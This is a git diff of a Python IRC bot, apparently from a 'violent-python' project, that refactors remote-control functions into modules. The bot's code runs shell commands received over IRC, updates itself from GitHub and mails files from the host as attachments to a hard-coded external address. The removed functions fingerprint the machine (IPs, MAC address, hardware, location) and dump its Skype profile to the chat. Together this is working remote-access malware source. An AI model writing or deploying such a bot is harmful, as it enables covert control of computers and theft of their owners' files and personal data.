@@ -19,8 +19,6 @@ import json
 from subprocess import Popen, PIPE, STDOUT
 from time import strftime, sleep
 from StringIO import StringIO
-# module imports
-import skype
 
 #TODO: make skype.findProfile select the largest main.db, instead of failing if there is more than 1
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
@@ -197,6 +195,12 @@ def broadcast(msg):                                               # function to 
 
 ############ Keyword functions
 
+from modules.skype import *
+from modules.geo import *
+from modules.network import *
+from modules.identification import *
+from modules.communication import *
+
 def run_shell(cmd, timeout=60, verbose=False):                    # run a shell command and return the output, verbose enables live command output via yield
     signal.signal(signal.SIGALRM, timeout_handler)
     signal.alarm(timeout)
@@ -294,35 +298,6 @@ def run(cmd, public=False, return_to=admin):                                    
         log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
         log("\n")
 
-def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Info",attch=[]): # function to send mail to a specified address with the given attachments
-    # do not use attch.append() witin function http://stackoverflow.com/a/113198/2156113
-    err = """\n
-        sudo mkdir -p /Library/Server/Mail/Data/spool\n
-        sudo /usr/sbin/postfix set-permissions\n
-        sudo /usr/sbin/postfix start
-        """
-    if len(attch) > 0:
-        for attachment in attch:
-            try:
-                cmd = 'uuencode %s %s | mailx -s "%s" %s' % (attachment.strip(), attachment.strip(), subj, to)
-                log('[+] Sending email...')
-                log('[<]    ',cmd)
-                sts = run(cmd, public=False)
-                return "Sending email to %s. (subject: %s, attachments: %s\n[X]: %s)" % (to, subj, str(attch), str(sts))
-            except Exception as error:
-                return str(error)
-    else:
-        p = os.popen("/usr/sbin/sendmail -t", "w")
-        p.write("To: %s" % to)
-        p.write("Subject: %s" % subj)
-        p.write("\n") # blank line separating headers from body
-        p.write('%s\n' % msg)
-        sts = p.close()
-    if sts != None:
-        return "Error: %s. Please fix Postfix with: %s" % (sts, err)
-    else:
-        return "Sent email to %s. (subject: %s, attachments: %s)" % (to, subj, str(attch))
-
 def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates the bot by downloading source from github, then running the update.sh script
     log('[*] Starting Selfupdate...')
     privmsg('[*] Starting Selfupdate...')
@@ -346,126 +321,6 @@ def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates t
             irc.send ( 'QUIT\r\n' )
             raise SystemExit
             sys.exit()
-
-def geo_locate(ip="",with_proxy=False):                                                   # fetch location based on IP
-    signal.signal(signal.SIGALRM, timeout_handler)
-    signal.alarm(5)
-    try:
-        if with_proxy:
-            geo_json = urllib2.urlopen('http://freegeoip.net/json/').read()
-        else:
-            proxy_handler = urllib2.ProxyHandler({})
-            opener = urllib2.build_opener(proxy_handler)
-            req = urllib2.Request('http://freegeoip.net/json/%s' % ip)
-            r = opener.open(req)
-            geo_json = r.read()
-    except Exception as e:
-        signal.alarm(0)
-        if str(e).find("404") != -1:
-            return ["No location info available for IP","","","","",""]
-        return ["failed: %s" % e,"","","","",""]
-    signal.alarm(0)
-
-    geo = json.loads(geo_json)
-
-    city = geo[u"city"].encode('utf-8')
-    region = geo[u"region_name"].encode('utf-8')
-    country = geo[u"country_name"].encode('utf-8')
-    zipcode = geo[u"zipcode"].encode('utf-8')
-
-    lat = geo[u"latitude"]
-    lng = geo[u"longitude"]
-
-    return [city,country,region,zipcode,lat,lng]
-
-def identify():                                                   # give some identifying info about the host computer
-    log('[+] Running v%s Identification Modules...' % version)
-    system = platform.mac_ver()[0]
-    if len(str(system)) < 1:
-        system = platform.platform()
-        log('[>]    System:    ',system)
-    else:
-        log('[>]    OS X:    ',system)
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8",80))
-    local_ip = s.getsockname()[0]
-    s.close()
-    log('[>]    Local:   ',local_ip)
-    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
-    log('[>]    Public:  ',public_ip)
-    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
-    log('[>]    MAC:     ',mac_addr)
-    return "[v%s/x%s] %s@%s u: %s l: %s p: %s MAC: %s" % (version, system.strip(), local_user, hostname, main_user, local_ip, public_ip, mac_addr)
- 
-def full_identify():                                              # give verbose identifying info about the host computer
-    log('[+] Running v%s Identification Modules...' % version)
-    privmsg('[+] Running v%s Identification Modules...' % version)
-    system = platform.mac_ver()[0]
-    if len(str(system)) < 1:
-        system = platform.platform()
-        log('[>]    System:    ',system)
-        privmsg('[>]      System:    %s' % system)
-    else:
-        log('[>]    OS X:    ',system)
-        privmsg('[>]      OS X:    %s' % system)
-
-    log('[>]    Bot:    ',local_user)
-    privmsg('[>]      Bot:    %s' % local_user)
-
-    log('[>]    User:    ',main_user)
-    privmsg('[>]      User:    %s' % main_user)
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8",80))
-    local_ip = s.getsockname()[0]
-    s.close()
-    log('[>]    Local:   ',local_ip)
-    privmsg('[>]      Local:   %s' % local_ip)
-
-    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
-    log('[>]    Public:  ',public_ip)
-    privmsg('[>]      Public:  %s' % public_ip)
-    
-    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
-    log('[>]    MAC:     ',mac_addr)
-    privmsg('[>]      MAC:     %s' % mac_addr)
-    
-    cmd = "system_profiler SPPowerDataType | grep Connected"
-    for line in run_shell(cmd):
-        log('[>]    Power:    ',line)
-        privmsg('[>]      Power:    %s' % line)
-    
-    cmd = "uptime"
-    for line in run_shell(cmd):
-        log('[>]    UP:    ',line)
-        privmsg('[>]      Up:    %s' % line)
-
-    geo_info = geo_locate()
-    location = geo_info[0]+", "+geo_info[1]+" ("+str(geo_info[4])+", "+str(geo_info[5])+")"
-
-    log('[>]    Geoip:    ',location)
-    privmsg('[>]      Location:    %s' % location)
-
-    try:
-        db_path = skype.findProfile(local_user)
-        log('[>]    Skype:    ')
-        privmsg('[>]      Skype:')
-        for line in skype.printProfile(db_path):
-            log('[>]              ',line)
-            privmsg('[>]         %s' % line)
-            sleep(1)
-    except:
-        log('[>]    Skype:    None Found.')
-        privmsg('[>]      Skype:    None Found.')
-    
-    cmd = "system_profiler SPHardwareDataType"
-    log('[>]    CMD:     ',cmd)
-    p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
-    hardware = p.stdout.read()
-    log('[>]    Hardware.')
-    privmsg(str(hardware))
-    
-    privmsg('[√] Done.')
 
 ############ The beef of things
 if __name__ == '__main__':
@@ -581,7 +436,7 @@ if __name__ == '__main__':
                         elif content[:6] == 'email$':
                             attch = content[6:].split(',')
                             to = "nikisweeting+bot@gmail.com"
-                            broadcast(sendmail(to,msg="whohooo",attch=attch))
+                            broadcast(email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))
 
                         elif content == '!geo':
                             location = str(geo_locate())
